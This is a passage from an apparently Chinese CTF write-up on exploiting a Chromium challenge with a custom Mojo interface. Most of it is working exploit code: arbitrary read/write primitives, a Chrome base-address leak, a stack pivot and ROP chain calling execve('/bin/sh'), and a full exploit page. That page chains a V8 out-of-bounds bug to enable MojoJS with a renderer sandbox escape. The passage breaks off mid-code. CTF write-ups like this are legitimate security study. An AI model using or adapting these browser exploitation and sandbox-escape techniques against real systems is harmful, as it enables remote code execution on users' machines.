<span class="token punctuation">&#125;</span> <span class="token comment">// while (vec_base == 0)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同时得知了 Ctf 对象的虚表指针，可以计算得到程序的基址：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> chrome_base <span class="token operator">=</span> vtable <span class="token operator">-</span> <span class="token number">0xbc774e0n</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后还可以构造任意地址读写：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">arb_read</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> addr<span class="token operator">+</span><span class="token number">8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> val <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">ctfRead</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> vec_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> vec_end<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> val<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">arb_write</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> addr<span class="token operator">+</span><span class="token number">8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> val <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> vec_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> vec_end<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> val<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>不过最终的 exp 中没有用到上面的任意地址读写的函数</p>
<h5 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h5><p>为什么要使用 ROP，而不是利用上面的任意地址读写，来泄露 libc 地址再改 <code>__free_hook</code> 的方式呢？</p>
<p>有多种原因：</p>
<ol>
<li>题目没有给 libc，泄露了 libc 地址，还得麻烦去查是上面版本的 libc</li>
<li>程序是 C++，调试的时候发现，malloc 和 free 都不是 glibc 里的 malloc 和 free，实际是 C++ 的 allocator，虽然调试的时候发现同样有类似的 hook，但是参数不好控制</li>
<li>程序使用了 execve，只要知道程序基址，很容易就可以算出 plt 的位置，不需要过多的 leak</li>
</ol>
<p>要想 ROP 就要控制栈，直接布局 ROP 在栈上是不太可能的，可以考虑栈迁移</p>
<p>调试下 chrome：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ python3 -m http.server <span class="token operator">&amp;</span>
$ gdb chromium/chrome
<span class="token builtin class-name">set</span> args --headless --disable-gpu --remote-debugging-port<span class="token operator">=</span><span class="token number">9222</span> --user-data-dir<span class="token operator">=</span>/tmp/userdata --enable-logging<span class="token operator">=</span>stderr --js-flags<span class="token operator">=</span><span class="token string">"--allow-natives-syntax"</span> http://127.0.0.1:8000/exploit.html
<span class="token builtin class-name">set</span> follow-fork-mode parent
b CtfInterfaceImpl::Read<span class="token punctuation">(</span>unsigned int, base::OnceCallback<span class="token operator">&lt;</span>void <span class="token punctuation">(</span>double<span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">)</span>
r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以发现调用方法的时候，rax 寄存器存的就是虚表的指针：<br><img src="/images/68622871/11.png" alt="debug"></p>
<p>程序含有 <code>xchg rax, rsp; ret</code> 的 gadget，那么可以栈迁移到虚表的地方进行 ROP，可以先伪造一个虚表，布置 ROP，然后改写 vtable 指针指向伪造的虚表，触发 <code>xchg rax, rsp; ret</code> 后栈迁移进行 ROP，执行 <code>execve(&quot;/bin/sh&quot;, &#123;NULL&#125;, &#123;NULL&#125;</code> 即可：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> fake_vtable <span class="token operator">=</span> vec_base<span class="token punctuation">;</span>
<span class="token keyword">let</span> rop_base <span class="token operator">=</span> vec_base<span class="token punctuation">;</span>

<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x3d994e1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// add rsp, 0x20; pop rbp; ret;</span>
<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x590510en</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// xchg rax, rsp; ret; -> ResizeVector (rax = vtable)</span>

<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x37bb280n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// pop rdi</span>
<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> rop_base<span class="token operator">+</span><span class="token number">14n</span><span class="token operator">*</span><span class="token number">8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// addrOf"/bin/sh"</span>

<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x099b8ee0n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// pop rsi</span>
<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> rop_base <span class="token operator">+</span> <span class="token number">13n</span> <span class="token operator">*</span> <span class="token number">8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// args</span>

<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> chrome_base <span class="token operator">+</span> <span class="token number">0x3655332n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// pop rdx</span>
<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> rop_base <span class="token operator">+</span> <span class="token number">13n</span> <span class="token operator">*</span> <span class="token number">8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// env</span>

<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> execve_plt<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// env</span>
<span class="token comment">// await ctfWrite(arb, 13, rop_base + 14n * 8n);       // addrOf"/bin/sh"</span>
<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">0n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">// NULL</span>
<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">0x68732f6e69622fn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// "/bin/sh"</span>
<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">// NULL</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'change vtable ...'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token punctuation">,</span> fake_vtable<span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'pwn!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">await</span> <span class="token function">ctfResize</span><span class="token punctuation">(</span>arb<span class="token punctuation">,</span> <span class="token number">0x2333</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>最终从 chrome 到拿 shell 的完整 exp 如下：</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mojo/mojo_bindings.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mojo/third_party/blink/public/mojom/CTF/ctf_interface.mojom.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">let</span> conversion_buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> float_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>conversion_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> int_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>conversion_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">BigInt</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">hex</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token string">'0x'</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token class-name">BigInt</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">i2f</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    int_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> float_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token class-name">Number</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">f2i</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    float_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> int_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>



<span class="token keyword">function</span> <span class="token function">make_objs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> oob_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">1.3</span><span class="token punctuation">,</span> <span class="token number">1.4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> obj_faker <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> float_arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    a<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">444444</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    b<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token punctuation">[</span>oob_arr<span class="token punctuation">,</span> obj_faker<span class="token punctuation">,</span> float_arr<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">function</span> <span class="token function">enable_mojo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token punctuation">[</span>oob_arr<span class="token punctuation">,</span> obj_faker<span class="token punctuation">,</span> float_arr<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">make_objs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'oob_arr.length = '</span> <span class="token operator">+</span> oob_arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> old_28 <span class="token operator">=</span> oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// external_pointer</span>
    <span class="token keyword">let</span> old_29 <span class="token operator">=</span> oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// base_pointer</span>
    <span class="token keyword">let</span> r13 <span class="token operator">=</span> old_28<span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff00000000n</span>

    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'old_28 = '</span> <span class="token operator">+</span> old_28<span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'old_29 = '</span> <span class="token operator">+</span> old_29<span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    
    <span class="token keyword">function</span> <span class="token function">addrOf</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        obj_faker<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">;</span>
        <span class="token keyword">return</span> oob_arr<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffn</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">arb_read</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff00000000n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">7n</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">8n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1n</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffffn</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> float_arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token keyword">function</span> <span class="token function">arb_write</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff00000000n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">7n</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">-</span> <span class="token number">8n</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1n</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffffn</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        float_arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">let</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> div_addr <span class="token operator">=</span> <span class="token function">addrOf</span><span class="token punctuation">(</span>div<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'div_addr = '</span> <span class="token operator">+</span> div_addr<span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> chrome_base <span class="token operator">=</span> <span class="token function">arb_read</span><span class="token punctuation">(</span>r13 <span class="token operator">|</span> <span class="token punctuation">(</span>div_addr <span class="token operator">+</span> <span class="token number">0xCn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x000000000c1bb7c0n</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'chrome_base = '</span> <span class="token operator">+</span> chrome_base<span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> is_mojo_js_enabled <span class="token operator">=</span> chrome_base <span class="token operator">+</span> <span class="token number">0x000000000c560f0en</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> is_mojo_js_test_enabled <span class="token operator">=</span> chrome_base <span class="token operator">+</span> <span class="token number">0x000000000c560f0fn</span><span class="token punctuation">;</span>


    <span class="token comment">// enable mojo</span>
    <span class="token function">arb_write</span><span class="token punctuation">(</span>is_mojo_js_enabled<span class="token punctuation">,</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">arb_write</span><span class="token punctuation">(</span>is_mojo_js_test_enabled<span class="token punctuation">,</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'mojo enable!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">sandbox_escape</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">ctfRead</span><span class="token punctuation">(</span><span class="token parameter">ctf<span class="token punctuation">,</span> offset</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> f_b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> i_b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">let</span> float_val <span class="token operator">=</span>  <span class="token keyword">await</span> ctf<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> r<span class="token punctuation">.</span>value<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
        f_b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> float_val<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>i_b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span><span class="token parameter">ctf<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> f_b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> i_b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

        i_b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">await</span> ctf<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>f_b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> r<span class="token punctuation">.</span>value<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">ctfResize</span><span class="token punctuation">(</span><span class="token parameter">ctf<span class="token punctuation">,</span> size</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">await</span> ctf<span class="token punctuation">.</span><span class="token function">resizeVector</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> r<span class="token punctuation">.</span>value<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
